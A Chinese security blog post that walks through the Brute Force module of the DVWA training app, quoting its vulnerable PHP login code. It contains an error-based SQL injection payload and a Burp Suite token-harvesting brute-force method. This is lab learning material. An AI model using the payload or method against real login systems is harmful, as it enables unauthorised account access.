<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" itemprop="url">Web渗透靶场</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/web%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web渗透</span></a></span></div></div><h1 class="post-title" itemprop="name headline">重温DVWA</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-01-10T07:54:39.529Z" title="发表于 2024-01-10 15:54:39">2024-01-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-01-14T11:03:04.826Z" title="更新于 2024-01-14 19:03:04">2024-01-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">16.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>70分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="重温DVWA"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/01/10/shen-ru-dvwa/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/01/10/shen-ru-dvwa/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/"><header><a class="post-meta-categories" href="/categories/Web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" itemprop="url">Web渗透靶场</a><a href="/tags/web%E6%B8%97%E9%80%8F/" tabindex="-1" itemprop="url">web渗透</a><h1 id="CrawlerTitle" itemprop="name headline">重温DVWA</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-01-10T07:54:39.529Z" title="发表于 2024-01-10 15:54:39">2024-01-10</time><time itemprop="dateCreated datePublished" datetime="2024-01-14T11:03:04.826Z" title="更新于 2024-01-14 19:03:04">2024-01-14</time></header><h1 id="0x01-brute-force">0x01 Brute Force</h1>
<h2 id="low">Low</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110161718337.png" alt="image-20240110161718337"></p>
<p>这一部分处理用户输入的username与password(md5加密)</p>
<pre><code class="hljs php"><span class="hljs-comment">// Check the database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '<span class="hljs-subst">$user</span>' AND password = '<span class="hljs-subst">$pass</span>';"</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>
        ( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );</code></pre>
<p>构造查询语句（处理用户输入的用户名和密码）接着与数据库连接，进入数据库进行匹配查询</p>
<p><code>mysqli_query</code>:  这是 MySQLi 扩展提供的函数，用于执行 SQL 查询。第一个参数是连接标识符，通常使用全局变量 <code>$GLOBALS["___mysqli_ston"]</code>，第二个参数包含sql查询的字符串</p>
<p><code>or die...</code>如果前面的语句执行失败，就会执行die后面的代码：后面的代码用于获取并输入MySQL错误信息。</p>
<p>首先判断<code>$GLOBALS["___mysqli_ston"]</code>是否为对象，如果是，这说明是存在连接错误，并用<code>mysqli_error</code>函数获取具体的错误信息；如果不是对象，则用<code>mysqli_connect_error</code>获取错误信息</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) {
        <span class="hljs-comment">// Get users details</span>
        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );
        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">"avatar"</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">{$user}</span>&lt;/p&gt;"</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"<span class="hljs-subst">{$avatar}</span>\" /&gt;"</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Login failed</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;
    }</code></pre>
<p><code>mysqli_num_rows</code>用于获取结果中的行数</p>
<p>如果查询到了返回结果，并且返回的结果行数为1，这说明成功找到对应的用户数据</p>
<p><code>mysql_fetch_assoc </code>从结果中取得一行作为关联数组，并获取该关联数组键值为avatar对应的value，随后就是一些信息的展示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110163523391.png" alt="image-20240110163523391"></p>
<p>调用mysqli_close关闭MySQL连接，并将关闭结果的布尔值赋值为对应的变量，如果成功关闭，返回false；否则返回变量本身的value</p>
<p>综上分析，该网站对于用户的登录次数并没有做出任何限制，可以尽情的爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165344749.png" alt="image-20240110165344749"></p>
<p>值得注意的是，这里的代码也没有对用户输入的数据进行过滤，这表明我们可以通过sql注入进去。但这里不能使用联合注入，因为并不会回回显相关查询信息。</p>
<p>但幸运的是我们可以进行万能密码和报错注入（因为mysql_error的存在）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174835187.png" alt="image-20240110174835187"></p>
<pre><code class="hljs php">username=admin<span class="hljs-string">'+and+updatexml(1,concat(0x7e,(select version())),1)--+&amp;password=bug&amp;Login=Login#</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110175628824.png" alt="image-20240110175628824"></p>
<p>当然盲注也是可以的，但手工效率低</p>
<h2 id="medium">Medium</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165457173.png" alt="image-20240110165457173"></p>
<p>中级水平如上所示。在开始的地方，分别对用户输入的username与password数据由<code>mysqli_real_escape_string</code>进行处理，对用户输入的特殊字符进行转义，特殊字符如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173234354.png" alt="image-20240110173234354"></p>
<p>剩下的基本一致，亮点在于，这里如果用户输入的数据与数据库数据不匹配，则会sleep 2，休眠2秒。但这对我们的爆力破解是无用的，只不过延长了我们爆破的时间</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173332294.png" alt="image-20240110173332294"></p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );</code></pre>
<p>首先调用了个自定义函数checkToken，并向其中传入用户的令牌以及session会话</p>
<p>并且在对用户的用户名和密码输入方面添加了<code>$user = stripslashes( $user );</code>进行处理，<code>stripslashes</code>在于删除用户输入的数据中可能含有的反引号```</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174218276.png" alt="image-20240110174218276"></p>
<p>这里依旧同之前的难度基本一致，不过睡眠时间成了随机了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110174313319.png" alt="image-20240110174313319"></p>
<p>最后这里说该函数是用来生成CSRF令牌的。综上所述，这里防止了CSRF的攻击，但我们仍可以进行暴力破解，不过麻烦的事需要在每次破解的时候，抓取页面的令牌token</p>
<p>这里我们关注一下token的处理，Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置：</p>
<pre><code class="hljs php"><span class="hljs-keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">'dvwa/includes/dvwaPage.inc.php'</span>;</code></pre>
<p>我们追踪位置，发现如下代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180228502.png" alt="image-20240110180228502"></p>
<p>这里的checktoken用于检查用户令牌。如果用户令牌与session会话不相等，则报错，并且还会重定向到index.php；而后续的generate函数用当前的时间戳md5值来生成session，这里复习一波如何用burpsuite来爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180711050.png" alt="image-20240110180711050"></p>
<p>抓包看到这里多了两个参数，但只需要关注token即可。值得注意的是这里含有302重定向，因此我们在bp设置的时候需要跟随以便获取index.php页面的某些数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191340667.png" alt="image-20240110191340667"></p>
<p>这里看到文章说线程最好设置为1，多线程基本不行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110191514438.png" alt="image-20240110191514438"></p>
<p>这里我们设置爆破点为password与token，其中payload 1 为正常的密码字典即可。payload2设置为递归提取</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191609562.png" alt="image-20240110191609562"></p>
<p>递归<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> （Recursive grep） 主要用于从服务器端提取有效数据，需先从服务器响应中提取数据在替换payload位置进行正则配置</p>
<p>注意：使用递归搜索时线程必须是1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191854218.png" alt="image-20240110191854218"></p>
<p>根据上述图片的步骤设置好，对于token的查找，我们在图片右侧选择获取响应，接着在下面的响应中找到token所在位置，鼠标选中即可，接着你会看到上方已经自动生成好了正则表达式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192046461.png" alt="image-20240110192046461"></p>
<p>如上图成功爆破</p>
<h2 id="impossible">Impossible</h2>
<p>前面的某些部分与High一般，我们重点看新增的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192548395.png" alt="image-20240110192548395"></p>
